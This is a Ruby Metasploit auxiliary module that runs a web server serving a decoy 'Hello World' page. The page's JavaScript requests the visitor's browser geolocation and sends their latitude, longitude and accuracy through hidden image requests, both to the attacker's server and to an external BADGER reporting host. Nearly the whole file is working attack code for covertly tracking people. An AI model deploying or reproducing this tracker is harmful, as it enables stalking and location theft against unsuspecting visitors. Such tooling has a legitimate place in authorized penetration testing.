require 'msf/core'

class MetasploitModule < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Badger_Report

	def initialize(info = {})
		super(update_info(info,
'Name'		=> 'HTML Geolocation Server (Badger)',
			'Description'	=> %q{
			This module can be used to spawn a HTTP server that serves
			HTML5, Javascript, and Java geolocation code.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt']
	))
	end

	def on_request_uri( cli, request )
		print_status("Requesting: #{request.uri}")
		if request.uri =~ /(gps=(.)+.jpg)/
			gps=$1.sub("gps=","").chomp(".jpg")
			print_status("#{self.name} Reporting Lat/Lon: #{gps}")
            
			return
		elsif request.uri.match(/\.js$/i)
			print_status("#{self.name} Generating Javascript and Sending To Browser")
			send_response_html( cli, generate_js(), { 'Content-Type' => 'application/javascript' } )
			return
		else
			print_status("#{self.name} Sending Location Request To Browser")
			send_response_html( cli, generate_html(), { 'Content-Type' => 'text/html' } )
			return
		end

	end

	def generate_html()
		path = get_resource()
		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=msf_html"

		html = <<-EOF
		<!doctype html>
		<head>
		<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
		<script type="text/javascript" src="#{path}/geolocate.js"></script>
		</head>
		<body>
		<h1>Hello World.</h1>
		<img src="#{reporting_uri}" width="1px" height="1px" />
		</body>
		</html>
		EOF
		return html
	end

	def generate_js()
		path = get_resource()
		js_data = <<-EOF
		var gotloc = false;
		function showPosition(pos) {
		gotloc = true;
		document.write('<img src="#{path}/gps='+pos.coords.latitude+','+pos.coords.longitude+'.jpg">');
		document.write('<img src="#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=msf_javascript&lat='+pos.coords.latitude+'&lng='+pos.coords.longitude+'&acc='+pos.coords.accuracy+'">');}
		if (navigator.geolocation) {navigator.geolocation.getCurrentPosition(showPosition);}
		EOF
		return js_data
	end
	
	def run
		@seed = Rex::Text.rand_text_alpha(12)
		@client_cache = {}
		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit
	end

end
